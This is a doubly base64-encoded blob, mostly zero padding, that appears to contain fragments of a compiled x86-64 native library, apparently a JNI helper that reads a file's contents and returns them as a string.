QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVBNUEh2cElnK3dJU0lzRjJTOEFBRWlGd0hRQy85QklnOFFJd3dBQUFBQUEvelhpTHdBQTh2OGw0eThBQUE4ZkFQTVBIdnBvQUFBQUFQTHA0Zi8vLzVEekR4NzZhQUVBQUFEeTZkSC8vLytROHc4ZSttZ0NBQUFBOHVuQi8vLy9rUE1QSHZwb0F3QUFBUExwc2YvLy81RHpEeDc2YUFRQUFBRHk2YUgvLy8rUTh3OGUrbWdGQUFBQTh1bVIvLy8va1BNUEh2cG9CZ0FBQVBMcGdmLy8vNUR6RHg3NmFBY0FBQUR5NlhILy8vK1E4dzhlK3ZML0pUMHZBQUFQSDBRQUFQTVBIdnJ5L3lWTkx3QUFEeDlFQUFEekR4NzY4djhsUlM4QUFBOGZSQUFBOHc4ZSt2TC9KVDB2QUFBUEgwUUFBUE1QSHZyeS95VTFMd0FBRHg5RUFBRHpEeDc2OHY4bExTOEFBQThmUkFBQTh3OGUrdkwvSlNVdkFBQVBIMFFBQVBNUEh2cnkveVVkTHdBQUR4OUVBQUR6RHg3Njh2OGxGUzhBQUE4ZlJBQUFTSTA5R1M4QUFFaU5CUkl2QUFCSU9maDBGVWlMQllZdUFBQkloY0IwQ2YvZ0R4K0FBQUFBQU1NUEg0QUFBQUFBU0kwOTZTNEFBRWlOTmVJdUFBQklLZjVJaWZCSXdlNC9TTUg0QTBnQnhralIvblFVU0lzRlZTNEFBRWlGd0hRSS8rQm1EeDlFQUFERER4K0FBQUFBQVBNUEh2cUFQYVV1QUFBQWRTdFZTSU05TWk0QUFBQklpZVYwREVpTFBZWXVBQURvMmY3Ly8raGsvLy8veGdWOUxnQUFBVjNERHg4QXd3OGZnQUFBQUFEekR4NzY2WGYvLy8vekR4NzZWVWlKNVVpQjdBQVFBQUJJZ3d3a0FFaUI3QUFRQUFCSWd3d2tBRWlCN0FBUUFBQklnd3drQUVpRDdEQklpYjNZei8vL1NJbTEwTS8vLzJSSWl3UWxLQUFBQUVpSlJmZ3h3RWlMaGRqUC8vOUlqUldzRFFBQVNJbldTSW5INk1IKy8vOUlpWVhvei8vL1NJTzk2TS8vL3dCMVFMZ0FBQUFBNjJCSWk1WG96Ly8vU0kyRjhNLy8vNzZBQUFBQVNJbkg2RjcrLy85SWhjQjBHVWlObGZEUC8vOUlpNFhRei8vL1NJbldTSW5INklEKy8vOUlpNFhvei8vL1NJbkg2RUgrLy8rRndIUzBTSXVGNk0vLy8waUp4K2orL2YvL3VBRUFBQUJJaTFYNFpFZ3JGQ1VvQUFBQWRBWG8xZjMvLzhuRDh3OGUrbFZJaWVWSWdld0FFQUFBU0lNTUpBQklnZXdBRUFBQVNJTU1KQUJJZ2V3QUVBQUFTSU1NSkFCSWdleXdBQUFBU0ltOWFNLy8vMGlKdFdEUC8vOUlpWlZZei8vL1pFaUxCQ1VvQUFBQVNJbEYrREhBU0l1RmFNLy8vMGlMQUV5TGdFZ0ZBQUJJaTQxWXovLy9TSXVGYU0vLy83b0FBQUFBU0luT1NJbkhRZi9RU0ltRmNNLy8vMGpIaGZEUC8vOEFBQUFBU01lRitNLy8vd0FBQUFCSWpZVUEwUC8vdXZBdkFBQytBQUFBQUVpSngrZzUvZi8vU0kyVjhNLy8vMGlMaFhEUC8vOUlpZFpJaWNmb1VQMy8vMGpIaFlEUC8vOEFBQUFBU01lRmlNLy8vd0FBQUFCSXg0V1F6Ly8vQUFBQUFFakhoWmpQLy84QUFBQUFTTWVGb00vLy93QUFBQUJJeDRXb3ovLy9BQUFBQUVqSGhiRFAvLzhBQUFBQVNNZUZ1TS8vL3dBQUFBQkl4NFhBei8vL0FBQUFBRWpIaGNqUC8vOEFBQUFBU01lRjBNLy8vd0FBQUFCSXg0WFl6Ly8vQUFBQUFNZUY0TS8vL3dBQUFBQklqWlh3ei8vL1NJMkZnTS8vLzBpSjFraUp4K2pKL1AvL1NJdUZhTS8vLzBpTEFFaUxpRGdGQUFCSWpaV0F6Ly8vU0l1RmFNLy8vMGlKMWtpSngvL1JTSW1GZU0vLy8waUxoWGpQLy85SWkxWDRaRWdyRkNVb0FBQUFkQVhvRVB6Ly84bkRBQUR6RHg3NlNJUHNDRWlEeEFqREFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCeUFBQUFBUnNET3pBQUFBQUZBQUFBSFBELy8wd0FBQUNzOFAvL2RBQUFBTHp3Ly8rTUFBQUE5ZkgvLzZRQUFBRHA4di8veEFBQUFCUUFBQUFBQUFBQUFYcFNBQUY0RUFFYkRBY0lrQUVBQUNRQUFBQWNBQUFBeU8vLy81QUFBQUFBRGhCR0RoaEtEd3QzQ0lBQVB4bzZLak1rSWdBQUFBQVVBQUFBUkFBQUFERHcvLzhRQUFBQUFBQUFBQUFBQUFBVUFBQUFYQUFBQUNqdy8vK0FBQUFBQUFBQUFBQUFBQUFjQUFBQWRBQUFBRW54Ly8vMEFBQUFBRVVPRUlZQ1F3MEdBdXNNQndnQUFCd0FBQUNVQUFBQUhmTC8vOFVCQUFBQVJRNFFoZ0pERFFZRHZBRU1Cd2dBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF